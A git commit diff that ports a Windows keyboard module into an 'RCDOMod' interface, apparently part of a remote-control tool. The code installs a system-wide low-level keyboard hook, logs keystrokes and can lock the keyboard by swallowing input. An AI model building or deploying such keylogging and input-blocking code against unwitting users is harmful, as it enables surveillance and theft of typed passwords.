7ea8c9b56600e88ee96c8c105e09eb085398fcb0
fwishyy <fwishytf2@gmail.com>
2021-10-31 15:55:23 +0800

    refactor!: port keyboard module to conform with RCDOMod interface

--- keyboard/keyboard.cpp
+++ keyboard/keyboard.cpp
@@ -1,16 +1,29 @@
-#include <Windows.h>
-#include <iostream>
-#include <sstream>
-
-LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
-void logKeystroke(int);
-void lockKeyboard();
-void releaseKeyboard();
-
-HHOOK ghHook; // global handle to the hook
-KBDLLHOOKSTRUCT kbdStruct;
+#include "keyboard.h"
 
 bool gKeyboardLocked = 0; // temporary global variable to simulate keyboard being either locked or released
+
+void KeyboardMod::start() {
+    
+    // set the keyboard hook for all processes on the computer
+    // runs the hookCallback function when hooked is triggered
+    if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
+        wprintf(L"%s: %d\n", "Hooked failed to install with error code", GetLastError());
+    }
+
+    wprintf(L"Hook successfully installed!\n");
+    
+    MSG msg;
+    while(GetMessage(&msg, NULL, 0, 0)) {
+        
+    }
+
+}
+
+void KeyboardMod::kill() {
+
+    UnhookWindowsHookEx(ghHook);
+
+}
 
 void logKeystroke(int vkCode) {
     // KBDLLHOOKSTRUCT stores the keyboard inputs as Virtual-Key codes
@@ -48,34 +61,4 @@ LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
     // returns a non-zero value if the keyboard is locked to prevent the input from reaching other processes
     return (gKeyboardLocked)? 1 : CallNextHookEx(ghHook, nCode, wParam, lParam);
-}
-
-void setHook() {
-    
-    // set the keyboard hook for all processes on the computer
-    // runs the hookCallback function when hooked is triggered
-    if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
-        wprintf(L"%s: %d\n", "Hooked failed to install with error code", GetLastError());
-    }
-
-    wprintf(L"Hook successfully installed!\n");
-
-}
-
-void releaseHook() {
-
-    UnhookWindowsHookEx(ghHook);
-
-}
-
-int wmain() {
-    
-    setHook();
-    
-    MSG msg;
-    while(GetMessage(&msg, NULL, 0, 0)) {
-        
-    }
-
-    return 0;
 }
